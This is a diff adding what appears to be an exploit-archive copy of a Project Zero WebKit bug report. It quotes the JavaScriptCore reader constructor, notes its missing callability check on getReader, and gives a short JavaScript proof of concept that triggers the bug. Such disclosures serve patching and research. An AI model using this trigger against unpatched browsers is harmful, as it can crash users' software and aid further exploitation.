@@ -1,0 +1,34 @@
+<!--
+Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=1085
+
+EncodedJSValue JSC_HOST_CALL constructJSReadableStreamDefaultReader(ExecState& exec)
+{
+    VM& vm = exec.vm();
+    auto scope = DECLARE_THROW_SCOPE(vm);
+
+    JSReadableStream* stream = jsDynamicDowncast<JSReadableStream*>(exec.argument(0));
+    if (!stream)
+        return throwArgumentTypeError(exec, scope, 0, "stream", "ReadableStreamReader", nullptr, "ReadableStream");
+
+    JSValue jsFunction = stream->get(&exec, Identifier::fromString(&exec, "getReader")); <<--- 1
+
+    CallData callData;
+    CallType callType = getCallData(jsFunction, callData);
+    MarkedArgumentBuffer noArguments;
+    return JSValue::encode(call(&exec, jsFunction, callType, callData, stream, noArguments));
+}
+
+It doesn't check whether |getReader| is callable or not.
+
+PoC:
+-->
+
+let rs = new ReadableStream();
+let cons = rs.getReader().constructor;
+
+rs.getReader = 0x12345;
+new cons(rs);
+
+<!--
+Tested on Webkit Nightly 10.0.2(12602.3.12.0.1, r210800)
+-->
